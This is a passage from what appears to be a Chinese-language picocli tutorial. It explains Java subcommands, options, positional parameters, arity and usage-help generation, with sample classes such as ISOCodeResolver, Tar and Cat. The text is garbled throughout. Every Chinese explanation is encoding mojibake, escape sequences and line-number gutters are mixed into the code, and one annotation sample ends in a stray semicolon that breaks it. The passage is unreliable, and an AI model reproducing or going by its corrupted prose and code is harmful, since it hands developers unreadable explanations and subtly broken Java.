%s", code.toLowerCase(), new Locale(code).getDisplayLanguage()));\n    }\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n 1. å½é¡¶çº§å½ä»¤æ²¡æå®ç°RunnableæCallableæ¶ï¼ç¨æ·å¿é¡»æå®ä¸ä¸ªå­å½ä»¤ï¼å­å½ä»¤æä¸ºå¿å¡«é¡¹ï¼ãè¿æ¯å¯éçï¼å¦æç¶å½ä»¤å¯ä»¥å¨åºç¨ç¨åºä¸­æ éå­å½ä»¤çæåµä¸èªè¡æ§è¡ï¼åªéå®ç°RunnableæCallableå³å¯ã\n 2. ä½¿ç¨@Commandæ æ³¨è¿ä¸ªç±»ï¼åæ¶éè¦æ³¨æçæ¯æä»¬ä½¿ç¨CommandLine.HelpCommand.classä½ä¸ºå­ç±»ï¼çæhelpå­å½ä»¤ã\n 3. å¯ä»¥éè¿ä¸¤ç§æ¹å¼å°èªå®ä¹å­å½ä»¤æ·»å å°é¡¶çº§å½ä»¤ä¸­ãæç®åçæ¹æ³æ¯åç±»ä¸­çæ¹æ³æ·»å @Commandæ³¨è§£ãå¯¹äºå­å½ä»¤çæ¯ä¸ªéé¡¹åä½ç½®åæ°ï¼æ·»å ä¸ä¸ªæ¹æ³åæ°ï¼å¹¶ä½¿ç¨@Optionæ@Parametersæ³¨éå¯¹è¿äºæ¹æ³åæ°è¿è¡æ³¨éãå¨ä¸é¢çç¤ºä¾ä¸­ï¼ä¸æ¦ç¨æ·è°ç¨å­å½ä»¤contaryï¼å³èæ¹æ³subCommandViaMethodå°±ä¼è¢«è°ç¨ã\n 4. å¨è¾å¤§çåºç¨ç¨åºä¸­ï¼éå¸¸ä¸ºæ¯ä¸ªå­å½ä»¤åå»ºä¸ä¸ªåç¬ç@Commandæ³¨éçç±»ãå¨ä¸é¢çç¤ºä¾ä¸­ï¼SubcommandAsClassç±»è¡¨ç¤ºlanguageå­å½ä»¤ãä¸æ¦ç¨æ·è°ç¨æ­¤å­å½ä»¤ï¼å°è°ç¨è¯¥ç±»çéåçrunæ¹æ³ãè¦æ³¨åå­å½ä»¤ï¼è¯·å¨ç¶å½ä»¤ç@Commandæ³¨éçå­å½ä»¤å±æ§ä¸­æå®å­å½ä»¤ç±»ï¼subcommands = { SubcommandAsClass.class, ... }ï¼ã\n 5. å¨ç±»çmainæ¹æ³ä¸­ï¼ä½¿ç¨CommandLine.executeæ¹æ³å¼å¯¼åºç¨ç¨åºãè¿å°è§£æå½ä»¤è¡ï¼å¤çéè¯¯ï¼å¤çä½¿ç¨è¯·æ±åçæ¬å¸®å©ï¼å¹¶è°ç¨ä¸å¡é»è¾ã\n 6. CommandLine.executeæ¹æ³è¿åä¸ä¸ªéåºä»£ç ãæ¨çåºç¨ç¨åºå¯ä»¥ä½¿ç¨æ­¤éåºä»£ç è°ç¨System.exitï¼ä»¥è¡¨ç¤ºè°ç¨è¿ç¨çæåæå¤±è´¥ã\n\n> æå³å­å½ä»¤çæ´å¤è¯¦ç»ä¿¡æ¯åæ¹é¢ï¼è¯·åéåèæåçå­å½ä»¤ä¸ç« ã\n\né¤äºä¸¤ä¸ªç¨æ·å®ä¹çå­å½ä»¤å¤ï¼ISOCodeResolveråºç¨ç¨åºè¿æä¾äºä¸ä¸ªå¸®å©å­å½ä»¤ï¼è¯¥å­å½ä»¤å°ä½¿ç¨å¸®å©æ¶æ¯æå°å°æ§å¶å°ãPicocliä¼èªå¨çææ­¤ä½¿ç¨å¸®å©æ¶æ¯ï¼\n\n$ ISOCodeResolver help\nUsage: ISOCodeResolver [COMMAND]\nResolves ISO country codes (ISO-3166-1) or language codes (ISO-639-1/-2)\nCommands:\n  help      Displays help information about the specified command\n  country   Resolves ISO country codes (ISO-3166-1)\n  language  Resolves one or more ISO language codes (ISO-639-1 or 639-2)\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# æ§è¡åæ¹åä»¥ä¸çä»£ç \n\nå®å¨ä½¿ç¨æ¹æ³å®ç°ï¼æ¹åå¦ä¸ï¼\n\npackage com.pwddd.picocli;/*\n * ISO code resolver: Picocli based sample application (with subcommands)\n * Explanation: <a href="https://picocli.info/quick-guide.html#_subcommands_example_iso_code_resolver">Picocli quick guide</a>\n * Source Code: <a href="https://github.com/remkop/picocli/blob/master/picocli-examples/src/main/java/picocli/examples/subcommands/SubcommandDemo.java">GitHub</a>\n * @author Andreas Deininger\n */\nimport picocli.CommandLine;\nimport picocli.CommandLine.Command;\nimport picocli.CommandLine.Model.CommandSpec;\nimport picocli.CommandLine.Parameters;\nimport picocli.CommandLine.ParameterException;\nimport picocli.CommandLine.Spec;\nimport java.util.Locale;\n\n@Command(name = "ISOCodeResolver", subcommands = { CommandLine.HelpCommand.class }, // |2|\n         description = "Resolve ISO country codes (ISO-3166-1) or language codes (ISO 639-1 or -2)")\npublic class ISOCodeResolver  { // |1|\n  @Spec CommandSpec spec;\n\n  @Command(name = "country", description = "Resolve ISO country code (ISO-3166-1, Alpha-2 code)") // |3|\n  void subCommandViaMethod(@Parameters(arity = "1..*", paramLabel = "<country code>",\n                                       description = "country code(s) to be resolved") String[] countryCodes) {\n    for (String code : countryCodes) {\n      System.out.println(String.format("%s: %s", code.toUpperCase(), new Locale("", code).getDisplayCountry()));\n    }\n  }\n\n  @Command(name = "language",description = "Resolve ISO language code (ISO 639-1 or -2, two/three letters)")\n  void subCommandViaMethodLanguage(@Parameters(arity = "1..*",\n          paramLabel = "<language code>",\n          description = "language code(s) to be resolved") String[] languageCodes){\n    for (String code : languageCodes) {\n      System.out.println(String.format("%s: %s", code.toLowerCase(), new Locale(code).getDisplayLanguage()));\n    }\n  }\n\n  public static void main(String[] args) {\n    int exitCode = new CommandLine(new ISOCodeResolver()).execute(args); // |5|\n    System.exit(exitCode); // |6|\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\nå®å¨ä½¿ç¨ç±»å®ç°ï¼æ¹åå¦ä¸ï¼\n\npackage com.pwddd.picocli;/*\n * ISO code resolver: Picocli based sample application (with subcommands)\n * Explanation: <a href="https://picocli.info/quick-guide.html#_subcommands_example_iso_code_resolver">Picocli quick guide</a>\n * Source Code: <a href="https://github.com/remkop/picocli/blob/master/picocli-examples/src/main/java/picocli/examples/subcommands/SubcommandDemo.java">GitHub</a>\n * @author Andreas Deininger\n */\nimport picocli.CommandLine;\nimport picocli.CommandLine.Command;\nimport picocli.CommandLine.Model.CommandSpec;\nimport picocli.CommandLine.Parameters;\nimport picocli.CommandLine.ParameterException;\nimport picocli.CommandLine.Spec;\nimport java.util.Locale;\n\n@Command(name = "ISOCodeResolver", subcommands = { CommandLine.HelpCommand.class,LanguageCommand.class,CountryCommand.class }, // |2|\n         description = "Resolve ISO country codes (ISO-3166-1) or language codes (ISO 639-1 or -2)")\npublic class ISOCodeResolver  { // |1|\n\n  public static void main(String[] args) {\n    int exitCode = new CommandLine(new ISOCodeResolver()).execute(args); // |5|\n    System.exit(exitCode); // |6|\n  }\n}\n\n@Command(name = "language",description = "Resolve ISO language code (ISO 639-1 or -2, two/three letters)")\nclass LanguageCommand implements Runnable{\n\n  @Parameters(arity = "1..*", paramLabel = "<language code>", description = "language code(s) to be resolved")\n  private String[] languageCodes;\n\n  @Override\n  public void run() {\n    for (String code : languageCodes) {\n      System.out.println(String.format("%s: %s", code.toLowerCase(), new Locale(code).getDisplayLanguage()));\n    }\n  }\n}\n\n@Command(name = "country",description = "Resolve ISO country code (ISO-3166-1, Alpha-2 code)")\nclass CountryCommand implements Runnable{\n\n  @Parameters(arity = "1..*", paramLabel = "<country code>", description = "country code(s) to be resolved")\n  private String[] countryCodes;\n\n  @Override\n  public void run() {\n    for (String code : countryCodes) {\n      System.out.println(String.format("%s: %s", code.toUpperCase(), new Locale("", code).getDisplayCountry()));\n    }\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n\n\n\n# éé¡¹ååæ°\n\nå½ä»¤è¡åæ°å¯ä»¥åä¸ºéé¡¹åä½ç½®åæ°ãéé¡¹æä¸ä¸ªåç§°ï¼ä½ç½®åæ°éå¸¸æ¯éé¡¹åé¢çå¼ï¼ä½å®ä»¬å¯è½æ¯æ··åçã\n\n\n\nPicocliå¯¹éé¡¹åä½ç½®åæ°æåç¬çæ³¨è§£ã\n\n\n# éé¡¹æ³¨è§£\n\n# æ®ééé¡¹\n\néé¡¹å¿é¡»æä¸ä¸ªæå¤ä¸ªåç§°ãéé¡¹åç§°éå¸¸ä»¥-æ--å¼å¤´ï¼ä½picocliåè®¸æ¨ä½¿ç¨æ¨æ³è¦çä»»ä½éé¡¹åç§°ã\n\nä¸é¢çç¤ºä¾æ¾ç¤ºäºå·æä¸ä¸ªæå¤ä¸ªåç§°çéé¡¹ãä½¿ç¨éé¡¹åæ°çéé¡¹åå¸®å©éé¡¹ã\n\nclass Tar {\n  @Option(names = "-c", description = "create a new archive")\n  boolean create;\n\n  @Option(names = { "-f", "--file" }, paramLabel = "ARCHIVE", description = "the archive file")\n  File archive;\n\n  @Parameters(paramLabel = "FILE", description = "one or more files to archive")\n  File[] files;\n\n  @Option(names = { "-h", "--help" }, usageHelp = true, description = "display a help message")\n  private boolean helpRequested;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nPicocliå¹ééé¡¹åç§°æ¥è®¾ç½®å­æ®µå¼ã\n\nPicocliæ¯æPOSIXéç¾¤ç­éé¡¹ï¼ä¸ä¸ªæå¤ä¸ªæ²¡æéé¡¹åæ°çåä¸ªå­ç¬¦éé¡¹ï¼å¶æ¬¡æ¯æå¤ä¸ä¸ªå¸¦æéé¡¹åæ°çéé¡¹ï¼å¯ä»¥åç»å¨ä¸ä¸ªâ-âç ´æå·åé¢ã\n\nString[] args = { "-c", "--file", "result.tar", "file1.txt", "file2.txt" };\nTar tar = new Tar();\nnew CommandLine(tar).parseArgs(args);\n\nassert !tar.helpRequested;\nassert  tar.create;\nassert  tar.archive.equals(new File("result.tar"));\nassert  Arrays.equals(tar.files, new File[] {new File("file1.txt"), new File("file2.txt")});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nä¾å¦ï¼å¯¹äºä¸é¢çTarç¤ºä¾ï¼ä»¥ä¸å½ä»¤è¡è°ç¨æ¯ç­ä»·çï¼\n\ntar -c -f result.tar f1.txt f2.txt\ntar -cf result.tar f1.txt f2.txt\ntar -cfresult.tar f1.txt f2.txt\n\n\n1\n2\n3\n\n\n# äº¤äºå¼å¯ç éé¡¹\n\nå¯¹äºæ è®°ä¸ºäº¤äºå¼çéé¡¹åä½ç½®åæ°ï¼ç³»ç»ä¼æç¤ºç¨æ·å¨æ§å¶å°ä¸è¾å¥å¼ãå¨Java 6ææ´é«çæ¬ä¸è¿è¡æ¶ï¼picocliå°ä½¿ç¨Console.readPassword APIï¼ä»¥ä¾¿ç¨æ·è¾å¥ä¸ä¼ååºå°æ§å¶å°ã\n\n\n# åæ°æ³¨è§£\n\nä»»ä½ä¸æ¯å­å½ä»¤ãéé¡¹æéé¡¹åæ°çå½ä»¤è¡åæ°é½ä¼è¢«è§£éä¸ºä½ç½®åæ°ãä½¿ç¨ï¼åºäºé¶çï¼ç´¢å¼å±æ§æ¥åç¡®æå®è¦æè·çåæ°ãçç¥ç´¢å¼å±æ§æå³çå­æ®µæè·ææä½ç½®åæ°ãæ°ç»æéåå­æ®µå¯ä»¥æè·å¤ä¸ªå¼ãç´¢å¼å±æ§æ¥åèå´å¼ï¼å æ­¤å@Parametersï¼index = "2.4")è¿æ ·çæ³¨éæè·ç´¢å¼2ã3å4çåæ°ãèå´å¼å¯ä»¥æ¯å¼æ¾å¼çãä¾å¦ï¼@Parametersï¼index = "3..*")æè·ç´¢å¼3åä»¥ä¸çææåæ°ã\n\nclass PositionalDemo {\n    @Parameters(index = "0")    InetAddress host;\n    @Parameters(index = "1")    int port;\n    @Parameters(index = "2..*") List<File> files;\n}\n\n\n1\n2\n3\n4\n5\n\n\nPicocliä½¿ç¨åæ°æ°ç»ä¸­æå®ç´¢å¼å¤çå¼åå§åå­æ®µã\n\nString[] args = { "localhost", "12345", "file1.txt", "file2.txt" };\nPositionalDemo params = CommandLine.populateCommand(new PositionalDemo(), args);\n\nassert params.host.getHostName().equals("localhost");\nassert params.port == 12345;\nassert params.files.equals(Arrays.asList(new File("file1.txt"), new File("file2.txt")));\n\n\n1\n2\n3\n4\n5\n6\n\n\nç¨æ·æåææ´å¤å³äºéé¡¹åä½ç½®åæ°çè¯¦ç»ä¿¡æ¯ï¼ä»¥å--éé¡¹ç»æåéç¬¦ååæ°æä»¶ï¼@-filesï¼ã\n\n\n# å¼ºç±»åè½¬æ¢\n\nå½å½ä»¤è¡éé¡¹åä½ç½®åæ°æ å°å°æ³¨è§£çå­æ®µæ¶ï¼ææ¬å¼å°è½¬æ¢ä¸ºæ³¨è§£çå­æ®µçç±»åã\n\n\n# ç±»åè½¬æ¢\n\nå¼ç®±å³ç¨ï¼picocliå¯ä»¥å°å½ä»¤è¡åæ°å­ç¬¦ä¸²è½¬æ¢ä¸ºè®¸å¤å¸¸è§æ°æ®ç±»åãæå³åç½®ç±»åçå®æ´åè¡¨ï¼è¯·åéç¨æ·æåï¼ä½ä¸è¬æ¥è¯´ï¼ææåå§ç±»ååå¶å¯¹è±¡ç­ä»·ç©ï¼ä»»ä½æä¸¾ä»¥åæä»¶ãæ¥æãURLãBigDecimalãæ­£åè¡¨è¾¾å¼æ¨¡å¼ç­å¸¸è§ç±»é½å¯ä»¥æåæ ·ä½¿ç¨ãå¨Java 7ä¸è¿è¡çåºç¨ç¨åºå¯ä»¥ä½¿ç¨Pathï¼å¨Java 8ä¸å¯ä»¥ä½¿ç¨æ°çjava.timeç±»ã\n\næ¨è¿å¯ä»¥ä½¿ç¨èªå®ä¹ç±»åè½¬æ¢å¨æ¥å¤çä¸è¿°åç½®æ°æ®ç±»åä»¥å¤çæ°æ®ç±»åã\n\n\n# éååå­å¸\n\nå¦æéé¡¹æä½ç½®åæ°å¯ä»¥å·æå¤ä¸ªå¼ï¼åå­æ®µç±»åå¿é¡»æ¯æ°ç»ãéåææ å°ãå¯ä»¥ä½¿ç¨ListãSetæQueueç­ä»»ä½éåå­ç±»ã\n\nä¸ä¸ªå¸¸è§çè¦æ±æ¯å·æç±»ä¼¼äºJavaç³»ç»å±æ§çé®å¼å¯¹çéé¡¹ï¼ä¾å¦-Dkey=valueãè¦å®ç°è¿ä¸ç¹ï¼æ¨åªéä½¿ç¨Mapå­æ®µå³å¯ã\n\nåªè¦ä¸ºé®åå¼ç±»åé½æ³¨åäºç±»åè½¬æ¢å¨ï¼æ å°å­æ®µçé®åå¼å¯è½å·æä»»ä½ç±»åãé®åå¼ç±»åä»Mapçéç¨ç±»ååæ°ä¸­æ¨æ­åºæ¥ãä¾å¦ï¼\n\nclass MapDemo {\n    @Option(names = {"-u", "--timeUnit"});\n    Map<java.util.concurrent.TimeUnit, Long> timeout;\n}\n\n\n1\n2\n3\n4\n\n\nä»¥ä¸å½ä»¤è¡å°çæMapä¸­çåä¸ªé®å¼æ¡ç®ï¼\n\n<command> -uDAYS=3 -u HOURS=23 -u=MINUTES=59 --timeUnit=SECONDS=13\n\n\n1\n\n\n\n# å¿éåæ°\n\n\n# å¿ééé¡¹\n\nå¯ä»¥æ è®°æéçéé¡¹ï¼ä½¿ç¨æ·å¿é¡»å¨å½ä»¤è¡ä¸æå®å®ä»¬ãå½æªæå®æéçéé¡¹æ¶ï¼å°ä»è§£ææ¹æ³ä¸­æåºMissingParameterExceptionãä¾å¦ï¼\n\n@Option(names = "-n", required = true, description = "mandatory number")\nint number;\n\n\n1\n2\n\n\n\n# å¿éåæ°\n\nä½¿ç¨arityè®©@Parameteråæ°å¼ºå¶ä½¿ç¨ï¼\n\n@Parameters(arity = "1..*", descriptions = "at least one File")\nList<File> files;\n\n\n1\n2\n\n\n\n# å¤å¼\n\n\n# éå¤éé¡¹\n\nåå»ºå¤å¼éé¡¹çæç®åæ¹æ³æ¯å£°æä¸ä¸ªå¸¦æ³¨éçå­æ®µï¼å¶ç±»åæ¯æ°ç»ãéåææ å°ã\n\n@Option(names = "-option")\nint[] values;\n\n\n1\n2\n\n\nä½¿ç¨å¦ä¸çå½ä»¤ï¼\n\n<command> -option 111 -option 222 -option 333\n\n\n1\n\n\næ¯ä¸ä¸ªåç´ é½ä¼è¢«æ·»å å°æ°ç»ä¸­ã\n\n\n# æ­£åæå\n\néé¡¹ååæ°è¿å¯ä»¥æå®ä¸ä¸ªæåæ­£åè¡¨è¾¾å¼ï¼ç¨äºå°æ¯ä¸ªéé¡¹åæ°æåä¸ºè¾å°çå­å­ç¬¦ä¸²ãæ¯ä¸ªå­å­ç¬¦ä¸²é½è½¬æ¢ä¸ºéåææ°ç»çç±»åãè¯·åééååå­å¸\n\n@Option(names = "-option", split = ",")\nint[] values;\n\n\n1\n2\n\n\nå¯ä»¥ä½¿ç¨å¦ä¸æ¹å¼ä¼ éåæ°ï¼\n\n-option 111,222,333\n\n\n1\n\n\n\n# arity\n\nææ¶ï¼æ¨æ³å®ä¹ä¸ä¸ªéé¡¹ï¼è¯¥éé¡¹éè¦ä¸ºå½ä»¤è¡ä¸çæ¯ä¸ªéé¡¹åºç°å¤ä¸ªéé¡¹åæ°ãArityå±æ§åè®¸æ¨åç¡®æ§å¶æ¯æ¬¡éé¡¹åçè¦æ¶èå¤å°åæ°ã\n\nArityå±æ§å¯ä»¥æå®æéåæ°çç¡®åæ°éï¼æå·ææå°åæå¤§åæ°æ°éçèå´ãæå¤§å¼å¯ä»¥æ¯ç²¾ç¡®çä¸éï¼ä¹å¯ä»¥æ¯â*âæ¥è¡¨ç¤ºä»»ææ°éçåæ°ãä¾å¦ï¼\n\nclass ArityDemo {\n    @Parameters(arity = "1..3", descriptions = "one to three Files")\n    File[] files;\n\n    @Option(names = "-f", arity = "2", description = "exactly two floating point numbers")\n    double[] doubles;\n\n    @Option(names = "-s", arity = "1..*", description = "at least one string")\n    String[] strings;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nå½å½ä»¤è¡ä¸æå®çåæ°å°äºæå°å¼æ¶ï¼ä¼æåºMissingParameterExceptionã\n\nå¦ææ²¡ææå®arityï¼åæ°çæ°éåå³äºå­æ®µçç±»åãç¨æ·æåææ´å¤å³äºarityçè¯¦ç»ä¿¡æ¯ã\n\n\n# Helpéé¡¹\n\nå½mixinStandardHelpOptionså½ä»¤å±æ§è®¾ç½®ä¸ºtrueæ¶ï¼picocliä¼å¨å½ä»¤ä¸­æ·»å mixinï¼è¯¥å½ä»¤å° usageHelpåversionHelpéé¡¹æ·»å å°å½ä»¤ä¸­ãä¾å¦ï¼\n\n@Command(mixinStandardHelpOptions = true, version = "auto help demo - picocli 3.0")\nclass AutoHelpDemo implements Runnable {\n\n    @Option(names = "--option", description = "Some option.")\n    String option;\n\n    @Override public void run() { ... }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nä¸è¿°ç¤ºä¾çä½¿ç¨å¸®å©æ¶æ¯å¦ä¸æç¤ºï¼\n\nUsage: <main class> [-hV] [--option=<option>]\n      --option=<option>   Some option.\n  -h, --help              Show this help message and exit.\n  -V, --version           Print version information and exit\n\n\n1\n2\n3\n4\n\n\n\n# èªå®ä¹helpéé¡¹\n\nåºç¨ç¨åºå¯ä»¥éè¿è®¾ç½®å±æ§versionHelp = trueã usageHelp = trueæhelp = trueæ¥å®ä¹èªå®ä¹å¸®å©éé¡¹ãå¦æå½ä»¤è¡ä¸æå®çåæ°ä¹ä¸æ¯âå¸®å©âéé¡¹ï¼å½ç¼ºå°æå¿é¡»çéé¡¹æ¶ï¼picocliä¸ä¼æåºMissingParameterExceptionã\n\n@Option(names = {"-V", "--version"}, versionHelp = true, description = "display version info")\nboolean versionInfoRequested;\n\n@Option(names = {"?", "-h", "--help"}, usageHelp = true, description = "display this help message")\nboolean usageHelpRequested;\n\n\n1\n2\n3\n4\n5\n\n\nå°è¿äºå±æ§ç¨äºè¯·æ±å¨æ§å¶å°ä¸æ¾ç¤ºä½¿ç¨å¸®å©æ¶æ¯æçæ¬ä¿¡æ¯çéé¡¹ã\n\nCommandLineç±»æä¾äºä¸¤ç§æ¹æ³ï¼åè®¸å¤é¨ç»ä»¶æ£æµæ¯å¦è¯·æ±äºä½¿ç¨å¸®å©æçæ¬ä¿¡æ¯ï¼æ éæ£æ¥å¸¦æ³¨éçåå¯¹è±¡ï¼ï¼\n\n * CommandLine.isUsageHelpRequested()å¦æè§£æå¨å¹éäºç¨ä½¿ç¨Help=trueæ³¨éçéé¡¹ï¼åè¿åtrue\n * å¦æè§£æå¨å¹éå¸¦æversionHelp=trueæ³¨éçéé¡¹ï¼CommandLine.isVersionHelpRequested()è¿åtrue\n\nCommandLine commandLine = new CommandLine(new App());\ncommandLine.parseArgs(args);\nif (commandLine.isUsageHelpRequested()) {\n   commandLine.usage(System.out);\n   return;\n} else if (commandLine.isVersionHelpRequested()) {\n   commandLine.printVersionHelp(System.out);\n   return;\n}\n// ... run App\'s business logic\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nå¦è¯·åéç¨æ·æåçâèªå¨æå°å¸®å©âä¸ç« ã\n\n\n# Version Help\n\n\n# éæçæ¬ä¿¡æ¯\n\nåºç¨ç¨åºå¯ä»¥å¨@Commandæ³¨éççæ¬å±æ§ä¸­æå®çæ¬ä¿¡æ¯ã\n\n@Command(version = "1.0")\nclass VersionedCommand { ... }\n\n\n1\n2\n\n\nCommandLine.printVersionHelpï¼PrintStreamï¼æ¹æ³ä»æ­¤æ³¨éä¸­æåçæ¬ä¿¡æ¯ï¼å¹¶å°å¶æå°å°æå®çPrintStreamã\n\nCommandLine commandLine = new CommandLine(new VersionedCommand());\n//...\ncommandLine.printVersionHelp(System.out);\n\n\n1\n2\n3\n\n\nè¯¥çæ¬å¯ä»¥æå®å¤ä¸ªå­ç¬¦ä¸²ï¼å¹¶å¯è½åå«æ è®°ä»¥æ¾ç¤ºANSIæ ·å¼åé¢è²ãä¾å¦ï¼\n\n@Command(version = {\n        "@|yellow Versioned Command 1.0|@",\n        "@|blue Build 12345|@",\n        "@|red,bg(white) (c) 2017|@" })\nclass VersionedCommand { ... }\n\n\n1\n2\n3\n4\n5\n\n\n\n\n\n# å¨æçæ¬ä¿¡æ¯\n\n@Commandæ³¨éæ¯æversionProviderå±æ§ãåºç¨ç¨åºå¯ä»¥å¨æ­¤å±æ§ä¸­æå®IVersionProviderå®ç°ï¼picocliå°å®ä¾åè¯¥ç±»å¹¶è°ç¨å®æ¥æ¶éçæ¬ä¿¡æ¯ã\n\nGitHubé¡¹ç®æä¸ä¸ªç¤ºä¾å®ç°ï¼å¯ä»¥ä»æ¸åæä»¶ä¸­è·åçæ¬ï¼å¦ä¸ä¸ªç¤ºä¾ä»æå»ºçæççæ¬å±æ§æä»¶ä¸­è·åçæ¬ä¿¡æ¯ã\n\n\n# Usage Help\n\n\n# ä½¿ç¨ä¿¡æ¯ç¤ºä¾\n\nPicocliä½¿æ¨çåºç¨ç¨åºå¯ä»¥è½»æ¾çæè¿æ ·çä½¿ç¨å¸®å©æ¶æ¯ï¼\n\nUsage: cat [-AbeEnstTuv] [--help] [--version] [FILE...]\nConcatenate FILE(s), or standard input, to standard output.\n      FILE                 Files whose contents to display\n  -A, --show-all           equivalent to -vET\n  -b, --number-nonblank    number nonempty output lines, overrides -n\n  -e                       equivalent to -vET\n  -E, --show-ends          display $ at end of each line\n  -n, --number             number all output lines\n  -s, --squeeze-blank      suppress repeated empty output lines\n  -t                       equivalent to -vT\n  -T, --show-tabs          display TAB characters as ^I\n  -u                       (ignored)\n  -v, --show-nonprinting   use ^ and M- notation, except for LDF and TAB\n      --help               display this help and exit\n      --version            output version information and exit\nCopyright(c) 2019\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nä½¿ç¨å¸®å©æ¶æ¯ç±æ³¨è§£å±æ§çæï¼å¦ä¸æç¤ºï¼\n\n@Command(name = "cat", footer = "Copyright(c) 2019",\n         description = "Concatenate FILE(s), or standard input, to standard output.")\nclass Cat {\n\n  @Parameters(paramLabel = "FILE", description = "Files whose contents to display")\n  List<File> files;\n\n  @Option(names = "--help", usageHelp = true, description = "display this help and exit")\n  boolean help;\n\n  @Option(names = "-t",                 description = "equivalent to -vT")  boolean t;\n  @Option(names = "-e",                 description = "equivalent to -vET") boolean e;\n  @Option(names = {"-A", "--show-all"}, description = "equivalent to -vET") boolean all;\n\n  // ...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# ä½¿ç¨å¸®å©æ¶æ¯åç´ \n\nä½¿ç¨å¸®å©æ¶æ¯çåç§åç´ å¾å®¹æç¨æ³¨è§£èªå®ä¹ã\n\n# å½ä»¤åç§°\n\nå¨ä¸é¢çç¤ºä¾ä¸­ï¼ç¨åºåç§°åèªå½ä»¤æ³¨éçåç§°å±æ§ï¼\n\n@Command(name = "cat")\n\n\n1\n\n\næ²¡æåç§°å±æ§ï¼picocliå°å¨æ¦è¦ä¸­æ¾ç¤ºä¸ä¸ªéç¨ç<main class>ï¼\n\nUsage: <main class> [-AbeEnstTuv] [--help] [--version] [FILE...]\n\n\n1\n\n\n# åæ°æ ç­¾\n\néå¸å°éé¡¹éè¦ä¸ä¸ªå¼ãä½¿ç¨å¸®å©åºè¯¥è§£éè¿ä¸ç¹ï¼picocliå¨æ¦è¦åéé¡¹åè¡¨ä¸­æ¾ç¤ºéé¡¹åæ°ãé»è®¤æåµä¸ï¼å­æ®µåæ¾ç¤ºå¨<å>æ¬å·ä¸­ãä½¿ç¨paramLabelå±æ§æ¾ç¤ºä¸åçåç§°ãä¾å¦ï¼\n\nUsage: <main class> [-f=FILE] [-n=<number>] NUM <host>\n      NUM        number param\n      host       the host\n  -f= FILE       a file\n  -n= <number>   number option\n\n\n1\n2\n3\n4\n5\n\n\nä»¥ä¸ç¤ºä¾ç±»ä¸­çä¸äºæ³¨éå­æ®µå·æparamLabelå±æ§ï¼èå¦ä¸äºåæ²¡æï¼\n\n@Command()\nclass ParamLabels {\n    @Option(names = "-f",    description = "a file",       paramLabel = "FILE") File f;\n    @Option(names = "-n",    description = "number option")                     int number;\n    @Parameters(index = "0", description = "number param", paramLabel = "NUM")  int n;\n    @Parameters(index = "1", description = "the host")                          InetAddress host;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# æåºçéé¡¹åè¡¨\n\né»è®¤æåµä¸ï¼éé¡¹åè¡¨æå­æ¯é¡ºåºæ¾ç¤ºéé¡¹ãä½¿ç¨sortOptions = falseå±æ§æç§æ¨ç±»ä¸­å£°æçé¡ºåºæ¾ç¤ºéé¡¹ã\n\n@Command(sortOptions = false)\n\n\n1\n\n\n# ç¼©åç®è¿°\n\nå¦æå½ä»¤éå¸¸å¤æå¹¶ä¸æå¾å¤éé¡¹ï¼ææ¶æå¥½ä½¿ç¨ç¼©åSynopsiså±æ§æå¶æ¦è¦ä¸­çç»èãä¾å¦ï¼\n\n@Command(abbreviateSynopsis = true)\nclass App { ... }\n\n\n1\n2\n\n\nè¿æ¾ç¤ºäºä¸é¢çæ¦è¦ãä½ç½®åæ°ä¸ç¼©åã\n\nUsage: <main class> [OPTIONS] [<files>...\n\n\n1\n\n\n# èªå®ä¹æ¦è¦\n\nä¸ºäºæ´å¥½å°æ§å¶æ¦è¦ï¼è¯·ä½¿ç¨customSynopsiså±æ§æå®ä¸ä¸ªæå¤ä¸ªæ¦è¦è¡ãä¾å¦ï¼\n\nUsage: ln [OPTION]... [-T] TARGET LINK_NAME   (1st form)\n  or:  ln [OPTION]... TARGET                  (2nd form)\n  or:  ln [OPTION]... TARGET... DIRECTORY     (3rd form)\n  or:  ln [OPTION]... -t DIRECTORY TARGET...  (4th form)\n\n\n1\n2\n3\n4\n\n\nè¦çæä¸è¿°æ¦è¦ï¼è¯·å¨customSynopsiså±æ§ä¸­æå®æå­ææ¬ï¼\n\n@Command(synopsisHeading = "", customSynopsis = {\n        "Usage: ln [OPTION]... [-T] TARGET LINK_NAME   (1st form)",\n        "  or:  ln [OPTION]... TARGET                  (2nd form)",\n        "  or:  ln [OPTION]... TARGET... DIRECTORY     (3rd form)",\n        "  or:  ln [OPTION]... -t DIRECTORY TARGET...  (4th form)",\n})\nclass Ln { ... }\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# å¤´é¨ååºé¨\n\næ é¢å°æ¾ç¤ºå¨ä½¿ç¨å¸®å©æ¶æ¯çé¡¶é¨ï¼å¤§çº²ä¹åï¼ãå¦ææ¨çå½ä»¤æå­å½ä»¤ï¼ç¬¬ä¸ä¸ªæ é¢è¡ä¹æ¯å­å½ä»¤åè¡¨ä¸­æ¾ç¤ºçè¡ï¼è¯·åé